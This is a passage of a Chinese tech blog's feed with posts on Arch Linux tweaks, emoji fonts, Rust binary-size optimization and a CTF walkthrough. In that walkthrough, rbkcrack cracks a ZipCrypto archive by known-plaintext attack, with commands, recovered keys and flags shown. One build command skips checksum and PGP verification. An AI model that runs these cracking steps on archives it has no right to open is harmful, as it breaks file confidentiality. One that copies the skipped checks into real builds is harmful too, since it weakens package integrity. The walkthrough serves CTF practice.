class="number">5</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: <span class="string">'cat'</span> <span class="keyword">is</span> <span class="string">'dog'</span></span><br><span class="line">Out[<span class="number">6</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>正确用法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">2</span>]: <span class="string">'Emacs'</span> <span class="keyword">is</span> <span class="string">'the best editor'</span></span><br><span class="line">Out[<span class="number">2</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: 我给你一次重新组织语言的机会</span><br><span class="line">Out[<span class="number">3</span>]: ...</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="string">'Emacs'</span> <span class="keyword">is</span> <span class="string">'the best editor'</span></span><br><span class="line">Out[<span class="number">4</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;headerlink&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;
&lt;p&gt;这是一篇闲蛋疼的文章, 讲述了闲蛋疼的我是如何&lt;s&gt;历经千辛万苦终于&lt;/s&gt;在 Python 中让 &lt;code&gt;&#39;a&#39; is &#39;b&#39;&lt;/code&gt; 得到 &lt;code&gt;True&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;s&gt;(虽然这件事情毫无意义)&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;&lt;s&gt;(不过拿来坑下一任或许是个好主意呢)&lt;/s&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="egg_pain" scheme="https://www.aloxaf.com/categories/egg-pain/"/>
    
    
      <category term="python" scheme="https://www.aloxaf.com/tags/python/"/>
    
      <category term="egg_pain" scheme="https://www.aloxaf.com/tags/egg-pain/"/>
    
  </entry>
  
  <entry>
    <title>Arch Linux 下使用 pwndbg</title>
    <link href="https://www.aloxaf.com/2018/10/arch_pwndbg/"/>
    <id>https://www.aloxaf.com/2018/10/arch_pwndbg/</id>
    <published>2018-10-19T05:47:04.000Z</published>
    <updated>2019-01-05T09:29:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>pwndbg 的安装: <code>pacman -S pwndbg</code> 然后添加 <code>source /usr/share/pwndbg/gdbinit.py</code> 到 <code>~/.gdbinit</code></p><p>然而要在 Arch Linux 下愉快地使用 pwndbg, 还要解决以下问题:</p><ul><li><a href="https://github.com/pwndbg/pwndbg/issues/340" target="_blank" rel="noopener">Arch Support - Roadmap</a> 搁了快一年的问题, 主要是 Arch 下没有 libc6-dbg 这种包, 要调试符号只能自己编译...</li><li><s><a href="https://github.com/pwndbg/pwndbg/issues/523#issuecomment-425673020" target="_blank" rel="noopener">Python exception under gdb-8.2-2</a> 上游 gdb 的问题, 8.3 应该会修复, 不过可以按链接所示的方法临时 patch 一下</s> gdb 8.2.1 已 fix</li></ul><p>这里解决第一个问题, 利用棒棒的 ABS (Arch Build System)</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">svn checkout --depth=empty svn://svn.archlinux.org/packages</span><br><span class="line"><span class="built_in">cd</span> packages</span><br><span class="line">svn update glibc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Build glibc (Fix #340)</span></span><br><span class="line"><span class="built_in">cd</span> glibc/repos/core-x86_64</span><br><span class="line"><span class="comment">## For Chinese users</span></span><br><span class="line"><span class="comment">## sed -i 's#ftp.gnu.org#mirrors.tuna.tsinghua.edu.cn#' PKGBUILD</span></span><br><span class="line"><span class="comment"># generate detached debugging symbols</span></span><br><span class="line">sed -i <span class="string">'s#!strip#debug#'</span> PKGBUILD</span><br><span class="line"><span class="comment"># skip check</span></span><br><span class="line">makepkg --skipchecksums --nocheck --skippgpcheck</span><br><span class="line">sudo pacman -U *.pkg.tar.xz</span><br></pre></td></tr></table></figure><p>缺点是每次升级 glibc 的时候要自己重新编译一遍......</p><p>(听说 Debug Symbols 的支持已经在进行中了?)</p><h2 id="后记"><a class="headerlink" href="#后记"></a>后记</h2><p>今天学长按照这个试了一下, 编译了一个下午都没编译完(然后怒转 mint ). 然后我才想起来第一次我也遇到了这个问题: 其实编译早就完成了, 只是一直在跑测试......(大概是因为 glibc 非常重要, 所以测试很多....) (不过测试虽然慢但我当时似乎也跑完了) (可能是因为我改了 <code>BUILDDIR</code> ?)</p><p>要取消测试可以简单地给 <code>makepkg</code> 添加 <code>--nocheck</code> 参数</p><p>或者一劳永逸(暴力)的办法: 在 <code>/etc/makepkg.conf</code> 中将 <code>BUILDENV</code> 中的 <code>check</code> 改为 <code>!check</code> (因为我被坑了一次后就加上了, 然后就忘了这个坑...)</p><p>P.S. 顺便也可以根据这篇文章 <a href="https://wiki.archlinux.org/index.php/Makepkg_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#%E7%BC%96%E8%AF%91%E7%BB%93%E6%9E%9C%E4%BC%98%E5%8C%96" target="_blank" rel="noopener">Makepkg_(简体中文)#编译结果优化</a> 优化一下其他参数, 主要是 <code>BUILDDIR</code> ,<code>CFLAGS</code>, <code>CXXFLAGS</code> 和 <code>MAKEFLAGS</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwndbg 的安装: &lt;code&gt;pacman -S pwndbg&lt;/code&gt; 然后添加 &lt;code&gt;source /usr/share/pwndbg/gdbinit.py&lt;/code&gt; 到 &lt;code&gt;~/.gdbinit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然而要在 Arch Linux 下愉快地使用 pwndbg, 还要解决以下问题:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/pwndbg/pwndbg/issues/340&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Arch Support - Roadmap&lt;/a&gt; 搁了快一年的问题, 主要是 Arch 下没有 libc6-dbg 这种包, 要调试符号只能自己编译...&lt;/li&gt;
&lt;li&gt;&lt;s&gt;&lt;a href=&quot;https://github.com/pwndbg/pwndbg/issues/523#issuecomment-425673020&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Python exception under gdb-8.2-2&lt;/a&gt; 上游 gdb 的问题, 8.3 应该会修复, 不过可以按链接所示的方法临时 patch 一下&lt;/s&gt; gdb 8.2.1 已 fix&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里解决第一个问题, 利用棒棒的 ABS (Arch Build System)&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>加速 AUR 软件安装速度</title>
    <link href="https://www.aloxaf.com/2018/10/arch_git/"/>
    <id>https://www.aloxaf.com/2018/10/arch_git/</id>
    <published>2018-10-18T08:15:30.000Z</published>
    <updated>2018-10-18T08:15:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>AUR 里的构建脚本常常需要从 github 拉取源代码,<br>然而没有加 <code>--depth 1</code> 的 <code>git clone</code> 把大量流量花在了下载对于构建毫无用处的提交记录等东西上面.</p><p>尤其是安装主题这种东西的时候, clone 下来几百 MB, 结果构建完得到一个几 MB 的包...</p><a id="more"></a><p>暴力的解决方案:</p><p>打开 <code>/usr/share/makepkg/source/git.sh</code>, 其中有一段这样的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! git <span class="built_in">clone</span> --mirror <span class="string">"<span class="variable">$url</span>"</span> <span class="string">"<span class="variable">$dir</span>"</span>; <span class="keyword">then</span></span><br><span class="line">error <span class="string">"<span class="variable">$(gettext "Failure while downloading %s %s repo")</span>"</span> <span class="string">"<span class="variable">$&#123;repo&#125;</span>"</span> <span class="string">"git"</span></span><br><span class="line">plain <span class="string">"<span class="variable">$(gettext "Aborting...")</span>"</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>改成这样, 也就是在外面又加了一层 if. 不直接改在原来的基础上加是因为有些网站不支持 <code>--depth</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! git <span class="built_in">clone</span> --depth=1 --mirror <span class="string">"<span class="variable">$url</span>"</span> <span class="string">"<span class="variable">$dir</span>"</span>; <span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> ! git <span class="built_in">clone</span> --mirror <span class="string">"<span class="variable">$url</span>"</span> <span class="string">"<span class="variable">$dir</span>"</span>; <span class="keyword">then</span></span><br><span class="line">error <span class="string">"<span class="variable">$(gettext "Failure while downloading %s %s repo")</span>"</span> <span class="string">"<span class="variable">$&#123;repo&#125;</span>"</span> <span class="string">"git"</span></span><br><span class="line">plain <span class="string">"<span class="variable">$(gettext "Aborting...")</span>"</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>同理, 还有如下代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! git fetch --all -p; <span class="keyword">then</span></span><br><span class="line"><span class="comment"># only warn on failure to allow offline builds</span></span><br><span class="line">warning <span class="string">"<span class="variable">$(gettext "Failure while updating %s %s repo")</span>"</span> <span class="string">"<span class="variable">$&#123;repo&#125;</span>"</span> <span class="string">"git"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>....改成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! git fetch --depth=1 -p; <span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> ! git fetch --all -p; <span class="keyword">then</span></span><br><span class="line"><span class="comment"># only warn on failure to allow offline builds</span></span><br><span class="line">warning <span class="string">"<span class="variable">$(gettext "Failure while updating %s %s repo")</span>"</span> <span class="string">"<span class="variable">$&#123;repo&#125;</span>"</span> <span class="string">"git"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>这样速度就令人满意多了, 对于大部分构建脚本应该都没问题,</p><p><s>遇到问题再改吧 (</s></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AUR 里的构建脚本常常需要从 github 拉取源代码,&lt;br&gt;
然而没有加 &lt;code&gt;--depth 1&lt;/code&gt; 的 &lt;code&gt;git clone&lt;/code&gt; 把大量流量花在了下载对于构建毫无用处的提交记录等东西上面.&lt;/p&gt;
&lt;p&gt;尤其是安装主题这种东西的时候, clone 下来几百 MB, 结果构建完得到一个几 MB 的包...&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>在 Linux 下使用 Blob Emoji</title>
    <link href="https://www.aloxaf.com/2018/10/linux_emoji/"/>
    <id>https://www.aloxaf.com/2018/10/linux_emoji/</id>
    <published>2018-10-10T11:00:45.000Z</published>
    <updated>2018-10-10T11:00:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>默认emoji太丑, 没有颜色, 看着浑身难受.</p><p>还是喜欢果冻人...</p><a id="more"></a><p>通过以下命令安装:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pikaur -S noto-fonts-emoji-blob</span><br></pre></td></tr></table></figure><p>然后往 <code>~/.config/fontconfig/conf.d/70-emojione-color.conf</code> 写入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE fontconfig SYSTEM "fonts.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">fontconfig</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">"family"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>sans-serif<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">"family"</span> <span class="attr">mode</span>=<span class="string">"prepend"</span> <span class="attr">binding</span>=<span class="string">"strong"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Blobmoji<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">"family"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>serif<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">"family"</span> <span class="attr">mode</span>=<span class="string">"prepend"</span> <span class="attr">binding</span>=<span class="string">"strong"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Blobmoji<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">"family"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>monospace<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">"family"</span> <span class="attr">mode</span>=<span class="string">"prepend"</span> <span class="attr">binding</span>=<span class="string">"strong"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Blobmoji<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">"family"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>Apple Color Emoji<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">"family"</span> <span class="attr">mode</span>=<span class="string">"prepend"</span> <span class="attr">binding</span>=<span class="string">"strong"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Blobmoji<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">fontconfig</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再执行 <code>fc-cache -f -v</code>, 果冻人就回来了!~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;默认emoji太丑, 没有颜色, 看着浑身难受.&lt;/p&gt;
&lt;p&gt;还是喜欢果冻人...&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>ZIP 明文攻击工具</title>
    <link href="https://www.aloxaf.com/2018/10/zip_crack/"/>
    <id>https://www.aloxaf.com/2018/10/zip_crack/</id>
    <published>2018-10-04T13:47:12.000Z</published>
    <updated>2019-04-11T09:33:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个国庆假期抽了点风......</p><p>写了一个假期的代码......</p><a id="more"></a><h1 id="简介"><a class="headerlink" href="#简介"></a>简介</h1><p>前两天自己也不记得受了啥刺激写了个 <a href="https://github.com/Aloxaf/ren3/" target="_blank" rel="noopener">ren3</a>.</p><p>写完以后大概是处于亢奋状态, 突然又想开坑, 然后又花了四天完成了</p><ul><li><a href="https://github.com/Aloxaf/rbkcrack" target="_blank" rel="noopener">rbkcrack</a> fork 了 bkcrack, 然后用 Rust 重(zhao)写(chao), 再然后用 <code>zip-rs·改</code> 替换掉手写的 parser, 实现了对 ZIP64 的一定程度上的兼容, 再顺便加上解压. 实测成功破解了 20+GB 的zip文件.</li><li><a href="https://github.com/Aloxaf/p7zip" target="_blank" rel="noopener">p7zip</a> 稍微改了一下计算秘钥的部分, 允许使用 <code>-p[key1_key2_key3]</code> 这种格式来直接指定三个 key.  (世界上最遥远的距离, 不是生与死, 而是我都拿到 keys 了,  却找不到工具解压......)</li></ul><h1 id="示例"><a class="headerlink" href="#示例"></a>示例</h1><p>就拿以前测试时出的一道题为例, 下载地址文末</p><blockquote><p>两个flag, 一个在flag.txt里, 一个在big_file开头</p><p>big_file里的那个我自己也弄不出来, 就又加了一个flag.txt</p><p>给了两个已知明文</p><p>hashcat是一开始随手加进来的, libc是后来为了测试工具随手加进来的</p><p>所以这里没有坑</p><p>PS. 17位大小写数字混合密码, 不用试图爆破...</p></blockquote><p>cipher.zip 里有4个文件, big_file 和 flag.txt 是等待破解的.</p><p>其中 big_file 压缩前大小高达 4.8 GiB, 使得这个 ZIP 文件包含了 ZIP64 格式.</p><blockquote><p>这个地方没有说这个文件是 ZIP64 格式, 而是说它包含了 ZIP64 格式.<br>因为一个 ZIP 文件理论上是可以包含多种压缩算法&amp;格式(好像是这样的), 所以我们可以选择其中的原始 ZIP 格式进行破解.</p></blockquote><p>然而面对这样的一个文件 pkcrack 和 AZPR 都会给出 <code>unknown signature</code> 一类的报错. 直接把路堵死了...</p><blockquote><p>其实 pkcrack 把报错代码注释掉就能跑了</p></blockquote><p>这个地方我们使用 rbkcrack.</p><blockquote><p>它的前身 bkcrack 其实也能爆破, 不过作者手写的 parser 完全没有考虑 ZIP64 格式, 在面对复杂文件时可能会跪...</p></blockquote><p>题目给了两个明文, libc 那个比较大, 爆破起来比较快. 于是执行如下命令开始攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack -c libc-2.23.so -p libc-2.23.so -C cipher.zip -P plain2.zip</span><br></pre></td></tr></table></figure><p>只花费了五秒钟就得到了keys.</p><blockquote><p>2019.04.11 更新:</p><p>rbkcrack 0.2.0 增加了自动根据 CRC32 寻找合适文件的功能,<br>于是上面的代码可以简写成 <code>rbkcrack -C cipher.zip -P plain2.zip -a</code></p><p>PS. 这个功能最大的用处其实是对付某些 GBK 编码的 zip 文件...</p></blockquote><p>PS. 重写完 bkcrack 后我拿一个文件测试了一下, 发现 Rust 版竟然比 C++ 版还快了 15%...... (改用 sort_unstabe 以后快了 25%......)</p><blockquote><p>2019.04.11 更新:</p><p>现在一样快了</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Generated 4194304 Z values.</span><br><span class="line">[22:11:22] Z reduction using 4512917 extra bytes of known plaintext</span><br><span class="line">0.11 % (4855 / 4512917)</span><br><span class="line">240 values remaining.</span><br><span class="line">[22:11:26] Attack on 240 Z values at index 4509032</span><br><span class="line">5.00 % (12 / 240)</span><br><span class="line">[22:11:27] Keys</span><br><span class="line">d4f34b9d a6ba3461 dcd97451</span><br></pre></td></tr></table></figure><p>得到 keys 以后直接使用如下代码可以从 cipher.zip 中解压 flag.txt.<br>(这个地方没有加 -u 开关, 因为 flag.txt 的压缩方式是 store)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack -c flag.txt -C cipher.zip -k d4f34b9d a6ba3461 dcd97451 -d ./flag.txt</span><br></pre></td></tr></table></figure><p>然后得到了第一个 flag: <code>flag{Th3Re_1s_Ano1h3r_f1ag_in_big_file}</code></p><p>big_file 是实打实的压缩过的, 需要加上 -u 开关提取. 由于文件非常大, 而且我们只要前面的一部分, 所以当看到 big_file 大小差不多了就可以 Ctrl+C 了.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack -c big_file -C cipher.zip -k d4f34b9d a6ba3461 dcd97451 -d ./big_file -u</span><br></pre></td></tr></table></figure><p>head 一下然后就得到了第二个 flag: <code>flag{Th1s_i3_A_tE5t}</code></p><p>最后强行给 p7zip 一个出场机会, 虽然做题的时候不大可能用到, 但是真要用来干大事儿还是它靠谱.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7za e cipher.zip <span class="string">'-p[d4f34b9d_a6ba3461_dcd97451]'</span></span><br></pre></td></tr></table></figure><p>下载地址: <a href="http://storage.aloxaf.cn/storage/fucking_problem.zip" target="_blank" rel="noopener nofollow">fucking_problem.zip</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个国庆假期抽了点风......&lt;/p&gt;
&lt;p&gt;写了一个假期的代码......&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.aloxaf.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://www.aloxaf.com/tags/ctf/"/>
    
      <category term="misc" scheme="https://www.aloxaf.com/tags/misc/"/>
    
      <category term="zip" scheme="https://www.aloxaf.com/tags/zip/"/>
    
      <category term="rust" scheme="https://www.aloxaf.com/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>优化 Rust 程序编译体积</title>
    <link href="https://www.aloxaf.com/2018/09/reduce_rust_size/"/>
    <id>https://www.aloxaf.com/2018/09/reduce_rust_size/</id>
    <published>2018-09-07T04:27:05.000Z</published>
    <updated>2019-11-22T05:51:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>体积狂魔の执念，记录一下以免忘记。</p><p><strong>2019-11-12 更新：</strong> 自这篇文章发表后已经过了一年，Rust 发生了许多变化，比如不再自带 Jemalloc 作为内存分配器。因此更新一下文章，参考了一个新项目 <a href="https://github.com/johnthagen/min-sized-rust" target="_blank" rel="noopener">min-sized-rust</a> 进行了更多的优化。</p><a id="more"></a><p>首先记录一下编译器版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ rustc --version</span><br><span class="line">rustc 1.41.0-nightly (5c5b8afd8 2019-11-16)</span><br></pre></td></tr></table></figure><p>这次不再采用 Hello，world 作为演示了，因为本身就没多少代码参考意义不大，本文的目的不是探究一个 Rust 程序能做到多小，而是一个<strong>实际的</strong> Rust 项目可以优化到多小。</p><p>翻了一下以前的项目，决定使用 <a href="https://github.com/Aloxaf/ren3/" target="_blank" rel="noopener">ren3</a> 作为优化对象：规模恰到好处，有足够的代码，又没有太多依赖。</p><p><em>那么，开始我们的 Optimization 吧！</em></p><h1 id="使用-release-构建"><a class="headerlink" href="#使用-release-构建"></a>使用 Release 构建</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo build --release</span><br></pre></td></tr></table></figure><p>最基本的优化体积方式之一，大家都懂的。Cargo 默认的编译模式是 dev ，该下没有进行任何优化，而且附带了大量调试信息。dev 模式下的程序别说几十兆，上百兆都是有可能的……</p><table><thead><tr><th>编译模式</th><th>体积</th><th>减少量</th></tr></thead><tbody><tr><td>dev</td><td>26.5M</td><td>100%</td></tr><tr><td>release</td><td>4.70M</td><td>17.7%</td></tr></tbody></table><p>可以看到 dev 和 release 两者差距非常大，没有特殊说明的话，后文就采用 release 模式下的 4.70M 作为基准来进行对比了</p><h1 id="使用-strip"><a class="headerlink" href="#使用-strip"></a>使用 strip</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip -s target/release/ren3</span><br></pre></td></tr></table></figure><p>最基本的优化体积方式之二，可以去除（对正常运行）无用的符号信息</p><table><thead><tr><th>优化方式</th><th>体积</th><th>减少量</th></tr></thead><tbody><tr><td>无</td><td>4.70M</td><td>100%</td></tr><tr><td>strip</td><td>2.11M</td><td>44.9%</td></tr></tbody></table><p>效果同样非常明显，直接减少了一半。</p><h1 id="调整优化等级"><a class="headerlink" href="#调整优化等级"></a>调整优化等级</h1><p><a href="https://doc.rust-lang.org/cargo/reference/manifest.html#the-profile-sections" target="_blank" rel="noopener">默认的 release 优化等级为 3</a>，这个等级下编译器会进行循环展开之类的操作以体积膨胀为代价提高程序运行速度。不过这次我们在优化体积，我们不需要以体积为代价的优化。因为我们调整优化等级为 <code>z</code>，意为最小二进制体积：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[profile.release]</span></span><br><span class="line"><span class="attr">opt-level</span> = <span class="string">'z'</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>优化方式</th><th>体积</th><th>变化</th></tr></thead><tbody><tr><td>无</td><td>4.70M</td><td>100%</td></tr><tr><td>strip</td><td>2.11M</td><td>44.9%</td></tr><tr><td><code>opt-level = 'z'</code></td><td>4.84M</td><td>103%</td></tr><tr><td><code>opt-level = 'z'</code> + strip</td><td>1.96M</td><td>41.7%</td></tr></tbody></table><p>emmm 非常尴尬的是未 strip 时的体积竟然略有增加，不过 strip 后体积确实再次减少了一点点，聊胜于无吧。</p><h1 id="开启-lto"><a class="headerlink" href="#开启-lto"></a>开启 LTO</h1><p>LTO（Link Time Optimization），意为链接时优化。可以消除大量冗余代码，减小二进制体积——代价是更长的链接时间</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[profile.release]</span></span><br><span class="line"><span class="attr">lto</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>优化方式</th><th>体积</th><th>变化</th></tr></thead><tbody><tr><td>无</td><td>4.70M</td><td>100%</td></tr><tr><td>strip</td><td>2.11M</td><td>44.9%</td></tr><tr><td><code>opt-level = 'z'</code></td><td>4.84M</td><td>103%</td></tr><tr><td><code>opt-level = 'z'</code> + strip</td><td>1.96M</td><td>41.7%</td></tr><tr><td><code>opt-level = 'z'</code> + LTO</td><td>2.79M</td><td>59.4%</td></tr><tr><td><code>opt-level = 'z'</code> + LTO + strip</td><td>1.56M</td><td>33.2%</td></tr></tbody></table><p>体积减小非常明显！</p><h1 id="调整并行代码生成单元数量"><a class="headerlink" href="#调整并行代码生成单元数量"></a>调整并行代码生成单元数量</h1><p>Cargo 默认会启用 16 个并行代码生成单元，对编译速度有提升，但是会妨碍某些优化的进行。我们限制到 1：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[profile.release]</span></span><br><span class="line"><span 